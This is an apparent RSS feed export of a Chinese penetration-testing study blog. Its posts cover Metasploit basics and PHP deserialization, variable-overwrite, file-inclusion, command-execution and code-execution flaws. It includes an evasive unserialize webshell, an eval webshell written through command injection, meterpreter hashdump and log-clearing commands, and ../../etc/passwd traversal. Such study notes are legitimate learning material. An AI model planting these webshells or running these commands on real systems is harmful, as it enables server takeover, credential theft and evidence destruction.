    <category term="内网渗透" scheme="https://dtxharry.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="渗透工具" scheme="https://dtxharry.github.io/categories/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="渗透工具" scheme="https://dtxharry.github.io/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
    
    <category term="木马" scheme="https://dtxharry.github.io/tags/%E6%9C%A8%E9%A9%AC/"/>
    
    <category term="远控" scheme="https://dtxharry.github.io/tags/%E8%BF%9C%E6%8E%A7/"/>
    
    <category term="提权" scheme="https://dtxharry.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>metasploit基本使用</title>
    <link href="https://dtxharry.github.io/2023/08/21/metasploit%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <id>https://dtxharry.github.io/2023/08/21/metasploit%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</id>
    <published>2023-08-21T08:50:34.000Z</published>
    <updated>2023-08-22T01:37:04.986Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Metasploit基础"><a href="#Metasploit基础" class="headerlink" title="Metasploit基础"></a>Metasploit基础</h1><h3 id="作用："><a href="#作用：" class="headerlink" title="作用："></a>作用：</h3><p>攻击nday漏洞</p><p>攻击模块：exp</p><p>​    怎么利用这个漏洞</p><p>攻击载荷 payload</p><p>​    维持通信用的。</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>sudo su root</p><h3 id="第一次启动msf"><a href="#第一次启动msf" class="headerlink" title="第一次启动msf"></a>第一次启动msf</h3><p>启动数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">systemctl start postgresql</span><br><span class="line">systemctl enable postgresql</span><br><span class="line">msfdb init</span><br><span class="line"># 启动msf终端</span><br><span class="line"> msfconsole</span><br><span class="line">msfupdate # 更新，不建议进行</span><br><span class="line"></span><br><span class="line">show auxiliary # ls/dir</span><br><span class="line"></span><br><span class="line">search arp_sweep #搜索命令</span><br><span class="line">search type:auxiliary ms17-010</span><br><span class="line"></span><br><span class="line">use auxiliary/scanner/discovery/arp_sweep </span><br><span class="line">use 编号</span><br><span class="line">选中之后的状态</span><br><span class="line">auxiliary(scanner/discovery/arp_sweep) &gt; </span><br><span class="line">back # 退出当前的模块</span><br><span class="line"></span><br><span class="line">sessions -l # 查看后台的sessions</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="进入模块之后的操作"><a href="#进入模块之后的操作" class="headerlink" title="进入模块之后的操作"></a>进入模块之后的操作</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">options # 查看配置</span><br><span class="line">required 是否必须的 yes（必填项） no （选填参数）</span><br><span class="line">rhosts 目标IP</span><br><span class="line"></span><br><span class="line">set name value # 配置参数</span><br><span class="line">run / exploit # 执行模块</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>ctrl+c 停止当前执行的内容</p><h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><p>后渗透的前提是已经拿下了目标服务器</p><p>  post/windows/manage/enable_rdp  # 开启远程桌面</p><h2 id="meterpreter-终端"><a href="#meterpreter-终端" class="headerlink" title="meterpreter 终端"></a>meterpreter 终端</h2><p>特殊的终端，msf专属</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">getuid # 查看当前用户的权限</span><br><span class="line">hashdump # 抓取用户的hash</span><br><span class="line">load mimikatz # 加载插件 </span><br><span class="line">shell # 进入目标终端</span><br><span class="line"></span><br><span class="line">exit # 退出</span><br><span class="line">clearev # 删除日志</span><br><span class="line"></span><br><span class="line">background # 挂起，放到后台运行</span><br></pre></td></tr></table></figure><h1 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit smb（软件名称、cve编号等）</span><br><span class="line">searchsploit -p   29767.txt # 查看内容</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">简单介绍一款经典且强大的工具&quot;美少妇&quot;</summary>
    
    
    
    <category term="web渗透" scheme="https://dtxharry.github.io/categories/web%E6%B8%97%E9%80%8F/"/>
    
    <category term="内网渗透" scheme="https://dtxharry.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="渗透工具" scheme="https://dtxharry.github.io/categories/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="渗透工具" scheme="https://dtxharry.github.io/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
    
    <category term="木马" scheme="https://dtxharry.github.io/tags/%E6%9C%A8%E9%A9%AC/"/>
    
    <category term="远控" scheme="https://dtxharry.github.io/tags/%E8%BF%9C%E6%8E%A7/"/>
    
  </entry>
  
  <entry>
    <title>反序列化漏洞</title>
    <link href="https://dtxharry.github.io/2023/08/21/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://dtxharry.github.io/2023/08/21/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-08-21T08:50:09.000Z</published>
    <updated>2023-08-21T15:14:09.342Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序列化和反序列化的定义"><a href="#序列化和反序列化的定义" class="headerlink" title="序列化和反序列化的定义:"></a>序列化和反序列化的定义:</h1><p>序列化 (serialize)是将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。【将状态信息保存为字符串】</p><p>反序列化就是再将这个状态信息拿出来使用。（重新再转化为对象或者其他的）【将字符串转化为状态信息】</p><p>类比:<br>序列化: 游戏的存档 =&gt; 把游戏当前的状态保存下来<br>反序列化: 游戏的读档 =&gt; 通过存档的信息恢复游戏的状态<br>一般情况下：只有类会反序列化和序列化</p><p>xxx::aaa()  =&gt;  类的方法（函数）; 类里面的函数，叫做方法<br>他去调用xxx类里的aaa()函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">反序列化免杀马：</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">chybeta</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;<span class="title function_ invoke__">array_map</span>(<span class="variable">$this</span>-&gt;test,<span class="variable">$this</span>-&gt;aaa);&#125;&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_REQUEST</span>[<span class="number">8</span>]);</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">a</span>();</span><br></pre></td></tr></table></figure><h1 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h1><p>自动化运行方法 - 不需要写就自动会运行方法 - 魔术方法</p><p>条件满足自动运行 // 不会关</p><p>魔术方法 =&gt; 特殊的函数 =&gt; 满足条件自动运行的函数</p><p>__wakeup :  unserialize就会调用</p><p>__xxxxx()</p><p>__toString</p><p>​    当对象被当作字符串输出的时候<br>​    echo 只能字符串</p><p>​    O:6:”readme”:1:{s:6:”source”;s:8:”flag.php”;}<br>​    反序列化需要的值</p><p>​    foreach($todos as $todo)<br>​    遍历数组： $todos的东西依次放入$todo<br>​    <li><?=$todo?></li></p><p>​    HTML + PHP </p><p>​    <li></li> html 行标签</p><p>​    &lt;?=$todo?&gt; PHP代码</p><p>​    &lt;?=$todo?&gt;<br>​    =&gt;<br>​    &lt;?php echo $todo?&gt;</p><h1 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h1><h2 id="Shiro反序列化漏洞"><a href="#Shiro反序列化漏洞" class="headerlink" title="Shiro反序列化漏洞"></a>Shiro反序列化漏洞</h2><h2 id="Weblogic反序列化漏洞"><a href="#Weblogic反序列化漏洞" class="headerlink" title="Weblogic反序列化漏洞"></a>Weblogic反序列化漏洞</h2>]]></content>
    
    
    <summary type="html">简单的介绍了序列化和反序列化以及一些经典的案例</summary>
    
    
    
    <category term="web渗透" scheme="https://dtxharry.github.io/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="反序列化漏洞" scheme="https://dtxharry.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>变量覆盖漏洞</title>
    <link href="https://dtxharry.github.io/2023/08/21/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://dtxharry.github.io/2023/08/21/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-08-21T08:49:57.000Z</published>
    <updated>2023-08-21T15:10:48.252Z</updated>
    
    <content type="html"><![CDATA[<h1 id="变量覆盖的定义"><a href="#变量覆盖的定义" class="headerlink" title="变量覆盖的定义:"></a>变量覆盖的定义:</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="number">2</span>;<span class="comment">//变量覆盖</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>变量覆盖漏洞有的时候可以直接让我们获取Webshell，拿到服务器的权限</p><h1 id="如何寻找"><a href="#如何寻找" class="headerlink" title="如何寻找?"></a>如何寻找?</h1><p>经常导致变量覆盖漏洞场景有：$$使用不当，extract()函数使用不当,parse_str()函数使用不当import_request_variables()使用不当，开启了全局变量注册等。</p><h2 id="1-extract"><a href="#1-extract" class="headerlink" title="1.extract()"></a>1.extract()</h2><p><strong>把数组变成变量</strong>, 数组里的键是变量名, 值是变量值<br>所以extract($_GET) =&gt; 所有的传参都是变量</p><h2 id="2-parse-str"><a href="#2-parse-str" class="headerlink" title="2.parse_str()"></a>2.parse_str()</h2><p><strong>把字符串变成变量</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="string">&quot;name=zkaq&amp;&amp;age=60&quot;</span>);   <span class="comment">// test=123&amp;gift=123</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$age</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="3-双美元符号"><a href="#3-双美元符号" class="headerlink" title="3.双美元符号"></a>3.双美元符号</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line"><span class="variable">$c</span> =<span class="string">&#x27;d&#x27;</span>;</span><br><span class="line"><span class="variable">$d</span> =<span class="string">&#x27;e&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$$$$a</span>;</span><br></pre></td></tr></table></figure><h1 id="键值分离"><a href="#键值分离" class="headerlink" title="键值分离"></a>键值分离</h1><p>foreach(数组 as 你命名的代表键的变量名=&gt;你命名的代表值的变量名)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">foreach(array(&quot;a&quot;=&gt;&quot;cat&quot;,&quot;b&quot;=&gt;&quot;dog&quot;)) as $_key =&gt; $_value&#123;</span><br><span class="line">echo $_key.&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">echo $_value.&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">//将数组键值分离</span><br></pre></td></tr></table></figure><h1 id="session和cookie"><a href="#session和cookie" class="headerlink" title="session和cookie"></a>session和cookie</h1><p>SESSION =&gt; 服务端识别身份的东西 =&gt; 公交刷卡系统<br>COOKIE =&gt; 客户端识别身份的东西 =&gt; 公交卡</p><p>Cookie的本质是随机字符串    //PHPSESSION=NF<br>任何人访问网站都有Cookie<br>大部分的网站，<strong>登陆前后，Cookie是不变的。核心Cookie是不变</strong>。</p><p>登录 变的是SESSION</p><p>登录网站成功后，校验账号密码通过后，他会给你的Cookie赋值上SESSION，然后你就可以拿着你被Cookie进入后台</p><p>SESSION有两个条件；<br>1、必须开启session<br>2、SESSION只能是通过变量赋值的方式产生</p><p>SESSION必须开启的时候才能用</p><p>SESSION开启的PHP文件</p><p>session_start()</p><p>创建什么样的SESSION？<br>1、分析代码<br>2、尝试法</p><p>绝大部分网站，管理员都叫admin \ 管理员用户ID 1 \权限都是管理员</p><p>判断权限是需要代码去判断</p><p>if(SESSION=XXXXX值 他是管理员 SESSION=YYYYY 他是用户)</p>]]></content>
    
    
    <summary type="html">介绍变量覆盖漏洞以及如何寻找该漏洞</summary>
    
    
    
    <category term="web渗透" scheme="https://dtxharry.github.io/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="变量覆盖漏洞" scheme="https://dtxharry.github.io/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>文件包含漏洞</title>
    <link href="https://dtxharry.github.io/2023/08/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    <id>https://dtxharry.github.io/2023/08/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-08-21T08:49:42.000Z</published>
    <updated>2023-08-21T15:08:55.594Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>攻击者利用包含的特性，加上应用本身对文件（包含）控制不严格，最终造成攻击者进行任意文件包含。（注：包含的文件会被当成脚本文件来解析）</p><h2 id="LFI-本地文件包含"><a href="#LFI-本地文件包含" class="headerlink" title="LFI :本地文件包含"></a>LFI :本地文件包含</h2><p> 本地文件包含(只能包含目标计算机上有的文件)</p><h2 id="RFI-远程文件包含"><a href="#RFI-远程文件包含" class="headerlink" title="RFI : 远程文件包含"></a>RFI : 远程文件包含</h2><p>远程文件包含（木马在别人的电脑上我也能包含）  罕见</p><h1 id="易混淆的重点"><a href="#易混淆的重点" class="headerlink" title="易混淆的重点:"></a>易混淆的重点:</h1><p>文件包含是开发必备的功能,本身不是漏洞,但是任意文件包含就是漏洞;<br>同理,代码执行不是漏洞,任意代码执行才是漏洞</p><h1 id="文件包含的本质："><a href="#文件包含的本质：" class="headerlink" title="文件包含的本质："></a>文件包含的本质：</h1><p>去除代码的冗余性<br>比如:a.php里面写好了数据库连接的函数,b.php中需要数据库的操作时,直接引用a.php就行</p><h1 id="四个PHP的引用函数"><a href="#四个PHP的引用函数" class="headerlink" title="四个PHP的引用函数"></a>四个PHP的引用函数</h1><h2 id="include-出现几次就包含几次"><a href="#include-出现几次就包含几次" class="headerlink" title="include[出现几次就包含几次]"></a>include[出现几次就包含几次]</h2><p>使用include引用外部文件时，只有代码执行到include代码段时，调用的外部文件才会被引用并读取，当引用的文件发生错误时，系统只会给出个警告错误，而整个php文件会继续执行。</p><h2 id="require"><a href="#require" class="headerlink" title="require"></a>require</h2><p>在php文件被执行之前，php解析器会让被引用的文件的全部内容替换require语句，然后与require语句之外的其他语句组成个新的php文件，最好后按新的php文件执行程序代码。</p><h2 id="include-once-once只在乎是否之前被包含过-不在乎是用require还是include还是-once"><a href="#include-once-once只在乎是否之前被包含过-不在乎是用require还是include还是-once" class="headerlink" title="include_once [_once只在乎是否之前被包含过,不在乎是用require还是include还是_once]"></a>include_once [_once只在乎是否之前被包含过,不在乎是用require还是include还是_once]</h2><p>在导入文件前先检测该文件是否在该页面的其他部分被引用过，如果有，则不会重复引用该文件，程序只能引用一次。（要导入的文件中存在一些自定义函数，那么如果在同一个程序中重复导入这个文件，在第二次导入时便会发生错误，因为php不允许相同名称的函数被重复声明）</p><h2 id="require-once"><a href="#require-once" class="headerlink" title="require_once"></a>require_once</h2><p>是require语句的延伸，他的功能与require语句基本一致，不同的是，在应用require_once时，先会检查要引用的文件是不是已将在该程序中的其他地方被引用过，如果有，则不会在重复调用该文件。（同时使用require_once语句在同一页面中引用了两个相同的文件，那么在输出时，只有第一个文件被执行，第二个引用的文件则不会被执行）</p><h2 id="（包含不存在文件的时候-include可以继续执行，require不可以）"><a href="#（包含不存在文件的时候-include可以继续执行，require不可以）" class="headerlink" title="（包含不存在文件的时候,include可以继续执行，require不可以）"></a>（包含不存在文件的时候,include可以继续执行，require不可以）</h2><h1 id="文件包含不区分文件后缀且不仅局限于包含根目录"><a href="#文件包含不区分文件后缀且不仅局限于包含根目录" class="headerlink" title="文件包含不区分文件后缀且不仅局限于包含根目录"></a>文件包含不区分文件后缀且不仅局限于包含根目录</h1><p>比如1.txt内是php代码,2.php包含1.txt时,页面会运行1.txt内的PHP语句</p><p>同时,被包含的文件可以不存在于网站根目录,因为是通过函数和路径去寻找并包含的; 然而解析漏洞只能将木马上传到网站的目录下才可以getshell.</p><h1 id="如何寻找文件包含漏洞"><a href="#如何寻找文件包含漏洞" class="headerlink" title="如何寻找文件包含漏洞"></a>如何寻找文件包含漏洞</h1><h2 id="1-代码审计"><a href="#1-代码审计" class="headerlink" title="1.代码审计"></a>1.代码审计</h2><h2 id="2-当传参里出现XX-XX-比如index-php-XX-php"><a href="#2-当传参里出现XX-XX-比如index-php-XX-php" class="headerlink" title="2.当传参里出现XX.XX,比如index.php,XX.php"></a>2.当传参里出现XX.XX,比如index.php,XX.php</h2><p>(1)文件包含漏洞<br>(2)任意文件读取漏洞<br>(3)任意文件下载漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www.XX.com/download/downfile.asp?filename=123.pdf </span><br><span class="line">可以尝试操作系统的敏感路径,比如../../../../etc/passwd或者window的各种敏感目录</span><br></pre></td></tr></table></figure><h1 id="防御策略"><a href="#防御策略" class="headerlink" title="防御策略"></a>防御策略</h1><p>1、无需情况下设置allow_url_include和allow_url_fopen为关闭</p><p>2、对可以包含的文件进行限制，可以使用白名单的方式，或者设置可以包含的目录，如open_basedir</p><p>3、建议假定所有输入都是可疑的，尝试对所有输入提交可能可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现../之类的目录跳转符。</p><p>4、严格检查include类的文件包含函数中的参数是否外界可控。</p>]]></content>
    
    
    <summary type="html">介绍文件包含漏洞以及如何寻找</summary>
    
    
    
    <category term="web渗透" scheme="https://dtxharry.github.io/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="文件包含漏洞" scheme="https://dtxharry.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>命令执行漏洞</title>
    <link href="https://dtxharry.github.io/2023/08/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>https://dtxharry.github.io/2023/08/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-08-21T08:44:00.000Z</published>
    <updated>2023-08-21T15:12:21.123Z</updated>
    
    <content type="html"><![CDATA[<h1 id="命令执行漏洞定义"><a href="#命令执行漏洞定义" class="headerlink" title="命令执行漏洞定义"></a>命令执行漏洞定义</h1><p>用户输入的数据被当做系统命令(cmd/bash)执行<br>whoami / net user / tasklist / xxx</p><p>dir / ls / rm -rf</p><h1 id="多行命令执行："><a href="#多行命令执行：" class="headerlink" title="多行命令执行："></a>多行命令执行：</h1><p>whoami&amp;net user&amp;ipconfig</p><p>拿到了命令执行漏洞后还可能想要webshell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="number">123</span> &gt; <span class="number">777</span>.txt</span><br><span class="line">可以尝试cmd的输出命令<span class="keyword">echo</span> “<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">8</span>])<span class="meta">?&gt;</span>” &gt;<span class="number">1</span>.php</span><br><span class="line">netstat -ano &gt; <span class="number">1</span>.txt </span><br><span class="line">disable_function PHP的禁用函数</span><br></pre></td></tr></table></figure><h1 id="命令执行函数："><a href="#命令执行函数：" class="headerlink" title="命令执行函数："></a>命令执行函数：</h1><p>system()  执行系统命令,直接输出</p><p>echo exec()    执行系统命令,没有输出,输出最后一行。</p><p>echo shell_exec(‘whoami’); 执行系统命令,没有输出,可以输出多行</p><p>echo `whoami`             //(反引号)与shell_exec 效果完全相同【调用,即简写】</p><p>passthru //只调用命令,他和system差不多</p><p>popen // 比较特殊的存在 [disable_function 是可以绕的]<br>        $a = popen(‘whoami’,’r’);         //返回的是一个文件的指针地址( //r是只读、w是写入)<br>        echo fread($a,1024);</p>]]></content>
    
    
    <summary type="html">极简地介绍命令执行漏洞(随时补充,未完待续)</summary>
    
    
    
    <category term="web渗透" scheme="https://dtxharry.github.io/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="命令执行漏洞" scheme="https://dtxharry.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>代码执行漏洞</title>
    <link href="https://dtxharry.github.io/2023/08/21/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>https://dtxharry.github.io/2023/08/21/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-08-21T08:43:51.000Z</published>
    <updated>2023-08-21T15:07:16.970Z</updated>
    
    <content type="html"><![CDATA[<h1 id="代码执行定义"><a href="#代码执行定义" class="headerlink" title="代码执行定义"></a>代码执行定义</h1><p>用户输入的数据当作后端代码执行,比如&lt;?php eval($_REQUEST[8])?&gt;</p><h1 id="代码执行的危险函数有哪些"><a href="#代码执行的危险函数有哪些" class="headerlink" title="代码执行的危险函数有哪些?"></a>代码执行的危险函数有哪些?</h1><p>​                <strong>eavl</strong>() 可以执行多行代码的代码执行函数<br>​                <strong>assert</strong>() 可执行单行 [如何变多行执行?]</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件写入函数：<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;2.php&#x27;</span>,<span class="string">&#x27;&lt;?php var_dump(8);phpinfo();?&gt;&#x27;</span>);<span class="comment">//把多行的函数用一行的文件写入函数执行</span></span><br></pre></td></tr></table></figure><p>​                <strong>preg_replace</strong>() 可执行单行 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">正则函数代码执行(也是单行执行的)： </span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/a/e&#x27;</span>,<span class="variable">$_GET</span>[<span class="number">8</span>],<span class="string">&#x27;abc&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line">   当正则表达式的修饰符为e且正则能匹配到的时候，要替换的内容(新的内容)会被当作代码执行(如果匹配失败则不会!!!)</span><br><span class="line">当<span class="keyword">eval</span>被过滤了,如果你可以控制正则表达式的修饰符，你也可以拿下目标,正则不可能被禁用</span><br><span class="line">PHP正则语法  <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/规则/修饰符&#x27;</span>,<span class="string">&#x27;新内容&#x27;</span>,<span class="string">&#x27;原内容&#x27;</span>)</span><br></pre></td></tr></table></figure><p>​                <strong>create_function</strong>() //匿名函数  [建立函数要写的代码太多了，我偷懒]</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">普通函数:<span class="function"><span class="keyword">function</span> 函数名(<span class="params">形参</span>)</span>&#123;要执行的代码&#125;</span><br><span class="line">匿名函数:<span class="title function_ invoke__">create_function</span>(形参,要执行的代码)</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$id&#x27;</span>,<span class="string">&#x27;echo $id;&#x27;</span>); 自定义函数<span class="variable">$a</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>(<span class="number">8</span>); <span class="comment">//执行echo $id;因为$id我传参是8所以 echo $id;</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$id&#x27;</span>,<span class="string">&#x27;$_REQUEST[8];&#x27;</span>); 自定义函数<span class="variable">$a</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>(<span class="number">8</span>); </span><br><span class="line"></span><br><span class="line">当然,如果函数不被调用(即没有<span class="keyword">echo</span><span class="variable">$a</span>(<span class="number">8</span>);),也是可以利用截断法触发代码执行的</span><br><span class="line">函数不被调用是不会被触发</span><br><span class="line"><span class="title function_ invoke__">create_function</span>(x,y)<span class="comment">//本质上相当于↓,</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xxx</span>(<span class="params">x</span>)</span>&#123;y&#125;  </span><br><span class="line">=&gt; y =  &#125;;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">//</span></span><br><span class="line">=&gt;fuction <span class="title function_ invoke__">XXX</span>(x)&#123;&#125;;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">//&#125;</span></span><br><span class="line">                      所以y可以传这个↑进行截断,不让函数进行调用,直接运行下面的函数</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​                <strong>array_map</strong>(要执行的函数,数组) <strong>回调函数</strong> //[批量调用某个函数]</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    fuction <span class="title function_ invoke__">cube</span>(<span class="variable">$n</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="variable">$n</span> * <span class="variable">$n</span> * <span class="variable">$n</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;cube&#x27;</span>, <span 